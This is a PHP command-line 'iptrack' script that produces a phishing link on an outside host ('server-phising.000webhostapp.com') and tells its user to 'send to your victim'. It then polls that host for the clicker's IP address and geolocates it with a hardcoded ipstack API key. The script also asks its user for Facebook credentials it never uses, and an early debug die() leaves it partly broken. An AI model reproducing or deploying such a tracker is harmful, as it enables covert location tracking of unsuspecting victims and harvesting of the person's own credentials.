<?php


$api_key = '2388107e74e7fe5424554967771b568b';
$urls = 'http://api.ipstack.com/125.167.75.123?access_key='.$api_key;
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $urls);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$x = curl_exec($ch);


var_dump($x);
die();
$rand = random_int(1000, 2000);
$banner = "
     /\   /\
  /\|  \/   \   /\
 /           \/   |  /\
/    --- -------   \/ |
 \  |===|||| ||||     /
/   |===|||| ||||    \_
\   |===|||||---  track\
/   |===|||||     -/\ --
\/\	 --- ---   /\/
   |/|/\      /
        \/|  /
           \/
------------------------
    [*] iptrack [*]
------------------------

";

echo $banner;
echo "User (fb) : ";
$user = trim(fgets(STDIN));
echo "pass (fb) : ";
$pass = trim(fgets(STDIN));
echo "\n";
echo "Enter to continue...\n";
echo "[*] =--------- 10%\n"; sleep(1);
echo "[*] ==-------- 20%\n"; sleep(1);
echo "[*] ===------- 30%\n"; sleep(1);
echo "[*] ====------ 40%\n"; sleep(1);
echo "[*] =====----- 50%\n"; sleep(1);
echo "[*] ======---- 60%\n"; sleep(1);
echo "[*] =======--- 70%\n"; sleep(1);
echo "[*] ========-- 80%\n"; sleep(1);
echo "[*] =========- 90%\n"; sleep(1);
echo "[*] ========== 100%\n";sleep(1);

$url = 'https://server-phising.000webhostapp.com/ip.php?rand='.$rand;
echo "\n";
echo "Send to your victim : ".$url;
echo "\n";
echo "Tab for continue...";
$tab = trim(fgets(STDIN));
$header = get_headers('https://server-phising.000webhostapp.com/ip_'.$rand.'.txt');
for ($i=0; $i < 9999; $i++) { 
	if (preg_match("/200/", $header[0])) {
		$ip = file_get_contents('https://server-phising.000webhostapp.com/ip_'.$rand.'.txt');

		$urls = 'http://api.ipstack.com/'.$ip.'?access_key='.$api_key;
		$data = file_get_contents($urls);
		break;
	}else{
		echo "#";
	}
	sleep(1);
}


// for ($i=0; $i < 999; $i++) { 
// 	$header = get_headers('https://server-phising.000webhostapp.com/ip_'.$rand.'.txt');
// 	var_dump($header);die();
// }

// while ($p == 1) {
// 	echo "{{    Masuk    }}";
// 	$url = "";
// 	$req = file_get_contents($url);
// }
echo "\nthank's for use my tool";
